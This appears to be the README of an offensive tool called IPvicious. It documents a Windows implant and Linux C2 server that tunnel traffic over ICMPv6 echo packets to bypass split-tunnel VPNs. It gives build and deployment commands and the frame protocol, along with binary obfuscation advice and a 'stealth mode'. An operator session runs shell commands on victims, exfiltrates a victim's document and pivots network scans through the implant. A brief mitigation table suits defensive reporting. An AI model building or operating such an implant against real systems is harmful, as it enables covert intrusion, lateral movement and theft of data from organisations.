# IPvicious — ICMPv6 Split-Tunnel Pivot

## Overview

Proof-of-concept demonstrating a **split-tunnel VPN bypass** that leverages ICMPv6 to pivot through a corporate network.

### Scenario

```
[Attacker host]                [C2 server (internet)]            [Windows workstation (victim)]
     │                                  │                                    │
     │  SOCKS5 TCP (localhost)          │        ICMPv6 Echo Req/Reply       │
     ├──────────────────────────────────┤◄───────────────────────────────────┤
     │                                  │    (outside VPN tunnel, IPv6 ISP)  │
     │                                                                        │
     │                                      IPv4 VPN tunnel                  │
     │                                  ┌───────────────────────────────────►│
     │                                  │                                    │  TCP to
     │                                  │                                    │  internal
     │                                  │                                    │  targets
```

**Key insight**: The endpoint has both a VPN IPv4 address and a public IPv6 address.  
The enterprise firewall performs *stateful inspection* — it allows outgoing ICMPv6 Echo Requests and the corresponding replies. The agent exploits this: it continuously sends ICMPv6 Echo Requests to the C2 server, embedding tunnel frames in the payload. The C2 replies with its own data in the Echo Reply payload.

Because the agent initiates all ICMPv6 traffic, no inbound rule is needed.

---

## Architecture

```
dist/agent.exe   – Windows agent (user-mode, no admin required)
dist/c2server    – Linux C2 server (requires root / CAP_NET_RAW)
```

### Tunnel protocol

Every ICMPv6 Echo Request/Reply carries a fixed **1200-byte** frame:

```
┌─────────────┬──────┬───────┬──────────┬────────┬──────────┬──────────────────┐
│  Magic (8B) │ Type │ Flags │ StreamID │ SeqNo  │ DataLen  │ Payload  +  pad  │
│  0xDEAD...  │ (1B) │ (1B)  │  (4B BE) │ (4B BE)│  (2B BE) │ up to 1180 bytes │
└─────────────┴──────┴───────┴──────────┴────────┴──────────┴──────────────────┘
                                                              Total = 1200 bytes
```

- **Magic** — 8-byte sentinel; frames from unrelated hosts are silently dropped  
- **Flags** — bit 0: `FlagCompressed` (payload is zlib-compressed); bit 1: `FlagEncrypted` (payload is AES-256-GCM encrypted)  
- **StreamID** — `0x00000000` = control, `0x80000000` = cmd, `0x80000001` = file, `1…N` = SOCKS5 relay streams

#### Compression

The protocol layer transparently applies **zlib** (`BestSpeed`) to payloads ≥ 64 bytes, and only uses the compressed form when it is strictly smaller than the original. Decompression is capped at `MaxData` (1180 bytes) to prevent zip-bomb expansion. The `FlagCompressed` bit is cleared from `Frame.Flags` after decoding — callers always receive raw bytes.

#### Encryption (optional PSK)

When a `-psk` is configured, every frame's `Data` field is **AES-256-GCM** authenticated-encrypted.

- Key derivation: `HMAC-SHA256(key="ipvicious-v1", data=psk)` → 32-byte AES-256 key  
- 12-byte random nonce prepended per frame (`crypto/rand`) — no nonce reuse risk  
- 16-byte authentication tag appended — any tampered or replayed frame is rejected  
- Total overhead: **28 bytes** per frame (`EncOverhead`); max plaintext data drops from 1180 → **1152 bytes** (`EncMaxData`)  
- Ordering: **compress → encrypt** (encode) / **decrypt → decompress** (decode)  
- Server silently drops frames that fail AES authentication (`ErrDecryptFailed`) — no reply, no fingerprint

### Message types

| Type | Hex | Direction | Purpose |
|------|-----|-----------|---------|
| `HELLO` | `0x01` | Agent→C2 | Registration / heartbeat |
| `DATA` | `0x02` | Both | SOCKS5 stream data |
| `STREAM_OPEN` | `0x03` | C2→Agent | Open TCP connection to target |
| `STREAM_CLOSE` | `0x04` | Both | Close stream |
| `CMD` | `0x05` | C2→Agent | Execute shell command |
| `CMD_OUT` | `0x06` | Agent→C2 | Command output chunk |
| `FILE_GET` | `0x07` | C2→Agent | Request file upload (agent→C2) |
| `FILE_PUT` | `0x08` | C2→Agent | Push file to agent (C2→agent) |
| `FILE_DATA` | `0x09` | Both | File content chunk |
| `FILE_END` | `0x0A` | Both | End of file transfer |
| `ACK` | `0x0B` | Agent→C2 | End of command output |
| `ERROR` | `0x0C` | Both | Error description (ASCII payload) |
| `NOOP` | `0x0D` | Both | Empty poll / keepalive |
| `SET_POLL` | `0x0E` | C2→Agent | Change poll interval |

---

## Build

### Prerequisites — Ubuntu 24.04

Ubuntu 24.04 LTS ships Go 1.22 which satisfies the `go 1.21` requirement.
No C cross-compiler is needed (`CGO_ENABLED=0` — all binaries are pure Go).

#### 1. System packages

```bash
sudo apt update
sudo apt install -y golang-go git make proxychains4
```

Verify the Go version:

```bash
go version
# go version go1.22.x linux/amd64
```

> **Note**: if your Ubuntu ships an older Go (check with `go version`), install
> the latest release manually:
> ```bash
> wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
> sudo rm -rf /usr/local/go
> sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
> echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
> source ~/.bashrc
> ```

#### 2. Go toolchain setup

```bash
# Make sure GOPATH/bin is in your PATH (needed for staticcheck and garble)
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
source ~/.bashrc
```

#### 3. staticcheck (linter)

```bash
go install honnef.co/go/tools/cmd/staticcheck@latest
staticcheck --version
```

#### 4. garble (optional — binary obfuscation)

Only required for `./build.sh --garble` builds:

```bash
go install mvdan.cc/garble@latest
garble version
```

#### 5. CAP_NET_RAW for the C2 server

The C2 server opens a raw ICMPv6 socket. Either run it as root or grant the
capability to the binary after building:

```bash
# Option A – run as root (simplest)
sudo ./dist/c2server

# Option B – grant CAP_NET_RAW to the binary (no root required at runtime)
sudo setcap cap_net_raw+ep dist/c2server
./dist/c2server
```

#### 6. proxychains4 configuration (for using the SOCKS5 proxy)

Edit `/etc/proxychains4.conf` (or `~/.proxychains/proxychains4.conf`):

```ini
# At the end of the file, replace the default socks4 line:
socks5  127.0.0.1  1080
```

Then use it:

```bash
proxychains4 curl http://10.0.1.100/
proxychains4 nmap -sT -Pn -p 80,443,8080 10.0.0.0/24
```

---

### Build

```bash
# Standard build (both binaries)
make

# Bake C2 address + PSK into the binary at compile time
make client-baked server-baked C2=2001:db8::1 SPORT=1080 POLL=50 PSK=mysecret

# Using build.sh helper
chmod +x build.sh
./build.sh --c2 2001:db8::1
./build.sh --c2 2001:db8::1 --psk mysecret

# Full string obfuscation with garble (recommended for deployments)
# Requires: go install mvdan.cc/garble@latest
./build.sh --garble --c2 2001:db8::1 --psk mysecret
```

All string literals (DLL names, API names, log messages) are XOR-encrypted at rest in the binary using a 16-byte key fragmented across four separate `var` declarations. The `garble -literals` flag adds a second layer that obscures all remaining string constants at compile time.

### String encryption tool

```bash
# Generate encrypted byte-slice literals for new strings:
go run ./tools/strenc "new string to encrypt"
# Output: []byte{0x.., 0x.., ...}
```

---

## Deployment

### 1. Start the C2 server (attacker's host)

```bash
# Interactive REPL (default) — SOCKS5 proxies are started per-agent from the shell
sudo ./c2server

# Custom SOCKS5 base port (proxies will be allocated from 2080 upward)
sudo ./c2server -socks-base 2080

# With PSK encryption
sudo ./c2server -psk "my-secret-key"

# Headless mode (no terminal, callbacks only)
sudo ./c2server -no-repl
```

Tunnel traffic is received on all interfaces via raw ICMPv6 (requires `root` or `CAP_NET_RAW`). SOCKS5 proxies are **not** started automatically — use the `socks` REPL command once an agent connects (see §4 below).

### 2. Deploy the agent (Windows workstation)

```bash
# With runtime flags
agent.exe -c2 <c2-ipv6-address> -poll 50

# With PSK encryption (must match server)
agent.exe -c2 <c2-ipv6-address> -poll 50 -psk "my-secret-key"

# Or bake in at compile time (binary needs no arguments)
make client-baked C2=2001:db8::1
```

Agent requires **no administrator rights**. It uses `Icmp6SendEcho2` from `iphlpapi.dll` (IP Helper API), available to all users since Windows Vista.

### 3. Use the SOCKS5 proxy

Start a proxy for the active agent from the REPL (`socks` auto-allocates a port, or specify one):

```
IPvicious[1]> socks          # binds 127.0.0.1:1080 (or next free port)
IPvicious[1]> socks 1081     # specific port
```

Then point any SOCKS5-aware tool at the reported address:

```bash
# Port scan internal network through the pivot
proxychains4 nmap -sT -Pn 10.0.0.0/24

# Browse to internal web application
proxychains4 curl http://10.0.1.100/admin
```

Each agent gets its own proxy on a distinct port. Use `stopsocks <addr>` to tear one down.

### 4. Interactive REPL

Once agents connect, the C2 server drops into an operator shell. The prompt shows the active agent index (`IPvicious[N]>`), or `IPvicious>` when none is selected.

```
IPvicious> help
  agents                       List all connected agents
  select <n>                   Select active agent by index
  status                       Active agent address + poll interval
  streams                      List active relay streams for active agent
  cmd    <command>             Execute shell command on active agent
  get    <remote> [local]      Download file from active agent
  put    <local>  <remote>     Upload file to active agent
  socks  [port]                Start SOCKS5 proxy for active agent (auto-port if omitted)
  stopsocks <addr>             Stop a SOCKS5 proxy by listen address
  sleep  <minutes>             Slow active agent poll (stealth mode)
  wake   [ms]                  Restore fast polling (default 50 ms)
  close  <id>                  Close a relay stream by ID
  exit                         Shut down C2 server
```

**Example session (two agents):**

```
[+] new agent 2001:db8::42#1 (echo#1 from [2001:db8::42]:0)
[+] new agent 2001:db8::43#1 (echo#1 from [2001:db8::43]:0)

IPvicious[1]> agents
  * [1] [2001:db8::42]:0  echo#1  poll=50 ms  last=12 ms ago  streams=0
    [2] [2001:db8::43]:0  echo#1  poll=50 ms  last=31 ms ago  streams=0

IPvicious[1]> status
  Address   : [2001:db8::42]:0
  Echo ID   : 1  (unique per agent.exe process)
  Last poll : 14 ms ago
  Next poll : in 36 ms
  Interval  : 50 ms

IPvicious[1]> socks
SOCKS5 proxy for agent 2001:db8::42#1 listening on 127.0.0.1:1080

IPvicious[1]> select 2
active agent → [2] 2001:db8::43#1

IPvicious[2]> socks
SOCKS5 proxy for agent 2001:db8::43#1 listening on 127.0.0.1:1081

IPvicious[2]> cmd whoami /all
[cmd output appears here]

IPvicious[2]> get C:\Users\victim\Desktop\secret.docx
[+] download complete: secret.docx (24576 bytes, 1.2s)

IPvicious[2]> sleep 10
agent poll slowed to 10 min (stealth mode)

IPvicious[2]> wake
agent poll set to 50 ms
```

---

## Tuning

| Parameter | Default | Description |
|-----------|---------|-------------|
| `-poll` / `defaultPollMs` | `50` ms | ICMPv6 poll interval (agent) |
| `-socks-base` / `defaultSocksBase` | `1080` | First TCP port for per-agent SOCKS5 proxies (server) |
| `-psk` / `defaultPSK` | *(disabled)* | AES-256-GCM pre-shared key (must match on both ends) |
| `socks [port]` REPL command | auto | Start a SOCKS5 proxy for the active agent |
| `sleep <min>` REPL command | — | Slow poll when agent is idle |
| `wake [ms]` REPL command | `50` ms | Restore fast poll on demand |

**Bandwidth estimate** (approximate, before compression):

```
Bandwidth ≈ (1000 / pollMs) × 1180 bytes × 2 (bidirectional)
At 50 ms:  20 polls/s × 1180 B ≈ 23 KB/s each direction
At 20 ms:  50 polls/s × 1180 B ≈ 58 KB/s each direction
```

Compression significantly improves effective throughput for text-heavy payloads (command output, source code, HTML). Binary/encrypted data will not compress.

---

## Security considerations (for the report)

| Risk | Mitigation |
|------|-----------|
| Split-tunnel IPv6 not blocked | Block all outbound ICMPv6 at perimeter, or deploy a full-tunnel VPN that captures IPv6 |
| ICMPv6 stateful inspection | Enable ICMPv6 rate limiting; alert on sustained high-rate echo traffic from a single host |
| Agent runs as unprivileged user | Endpoint EDR should flag `Icmp6SendEcho2` usage patterns and anomalous ICMP payload sizes |
| No authentication on SOCKS5 | Bind SOCKS5 to `127.0.0.1` only (default); add firewall rule to restrict access |
| Zip-bomb via crafted frame | Decompressed output capped at `MaxData` (1180 B); oversized results are rejected |
| C2 traffic readable on the wire | Enable PSK encryption (`-psk`); AES-256-GCM provides confidentiality + integrity for all frame data |

---

## File structure

```
cmd/
  client/main.go          – Windows agent entry point
  server/main.go          – Linux C2 server entry point (-socks, -no-repl flags)
internal/
  crypto/xor.go           – XOR string obfuscation (fragmented 16-byte key)
  protocol/
    messages.go           – Frame constants, Encode/Decode (variadic AEAD)
    compress.go           – zlib helpers (transparent, zip-bomb safe)
    encrypt.go            – AES-256-GCM helpers, NewAEAD, FlagEncrypted
    protocol_test.go      – Round-trip, compression, encryption, bad-magic tests
  icmpv6/
    windows.go            – Icmp6SendEcho2 wrapper (user-mode, no admin)
    linux.go              – Raw socket ICMPv6 listener + ICMPFilter
  tunnel/
    common.go             – Stream, StreamTable (shared by client + server)
    client.go             – Windows poll loop, dynamic poll via SET_POLL
    server.go             – Linux C2 recv/dispatch, session mutex
  agent/
    agent.go              – Shell exec, file transfer callbacks
    relay.go              – Bidirectional TCP relay (SOCKS5 → IPv4 target)
  socks5/socks5.go        – SOCKS5 RFC 1928 proxy (C2 side, CONNECT only)
  cli/repl.go             – Interactive operator REPL (cmd/get/put/sleep/wake…)
tools/
  strenc/main.go          – String encryption helper
Makefile                  – Build targets: standard / baked / garble
build.sh                  – Convenience wrapper for Makefile
```
